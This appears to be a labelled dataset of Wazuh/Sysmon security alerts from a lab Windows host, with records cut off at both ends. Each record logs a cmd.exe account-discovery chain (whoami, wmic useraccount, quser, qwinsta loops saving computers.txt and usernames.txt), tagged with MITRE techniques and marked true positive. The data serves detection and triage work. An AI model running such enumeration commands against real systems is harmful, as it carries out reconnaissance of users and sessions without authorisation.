SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.7386016Z", "eventRecordID": "395404", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 11, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2122148", "timestamp": "2025-07-05T13:02:58.720+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.720Z"]}, "sort": [1751720578720]}}
{"id": "wqmu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "wqmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "FIND.EXE", "image": "C:\\\\Windows\\\\System32\\\\find.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Find String (grep) Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9c01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "7320", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.748", "hashes": "SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "find  /v \\\"#\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.748\r\nProcessGuid: {ff3427f9-2281-6869-9c01-000000001500}\r\nProcessId: 7320\r\nImage: C:\\Windows\\System32\\find.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Find String (grep) Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FIND.EXE\r\nCommandLine: find  /v \"#\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.7536802Z", "eventRecordID": "395405", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 12, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2130137", "timestamp": "2025-07-05T13:02:58.722+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.722Z"]}, "sort": [1751720578722]}}
{"id": "w6mu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "w6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "FIND.EXE", "image": "C:\\\\Windows\\\\System32\\\\find.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Find String (grep) Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9d01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "1788", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.757", "hashes": "SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "find  /v \\\"console\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.757\r\nProcessGuid: {ff3427f9-2281-6869-9d01-000000001500}\r\nProcessId: 1788\r\nImage: C:\\Windows\\System32\\find.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Find String (grep) Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FIND.EXE\r\nCommandLine: find  /v \"console\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.7618193Z", "eventRecordID": "395407", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 13, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2137945", "timestamp": "2025-07-05T13:02:58.727+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.727Z"]}, "sort": [1751720578727]}}
{"id": "xKmu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "xKmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9e01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "3388", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.806", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe  /S /D /c\\\" echo console \\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.806\r\nProcessGuid: {ff3427f9-2281-6869-9e01-000000001500}\r\nProcessId: 3388\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\WINDOWS\\system32\\cmd.exe  /S /D /c\" echo console \"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.8166034Z", "eventRecordID": "395411", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 14, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2145777", "timestamp": "2025-07-05T13:02:58.738+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.738Z"]}, "sort": [1751720578738]}}
{"id": "xqmu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "xqmu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "FIND.EXE", "image": "C:\\\\Windows\\\\System32\\\\find.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Find String (grep) Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-a001-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "5864", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.825", "hashes": "SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "find  /v \\\"console\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.825\r\nProcessGuid: {ff3427f9-2281-6869-a001-000000001500}\r\nProcessId: 5864\r\nImage: C:\\Windows\\System32\\find.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Find String (grep) Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FIND.EXE\r\nCommandLine: find  /v \"console\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.8278073Z", "eventRecordID": "395413", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 16, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2161570", "timestamp": "2025-07-05T13:02:58.743+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.743Z"]}, "sort": [1751720578743]}}
{"id": "x6mu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "x6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-a101-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "3944", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.860", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\WINDOWS\\\\system32\\\\cmd.exe /c qwinsta /server:snell | findstr \\\"Active Disc\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.860\r\nProcessGuid: {ff3427f9-2281-6869-a101-000000001500}\r\nProcessId: 3944\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\WINDOWS\\system32\\cmd.exe /c qwinsta /server:snell | findstr \"Active Disc\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.8710770Z", "eventRecordID": "395419", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 17, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2169402", "timestamp": "2025-07-05T13:02:58.759+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.759Z"]}, "sort": [1751720578759]}}
{"id": "zKmu2pcBGfDWR0X_9r5E", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "zKmu2pcBGfDWR0X_9r5E", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-20c8-6869-f800-000000001500}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-228a-6869-aa01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "2440", "processId": "2360", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:03:06.713", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": 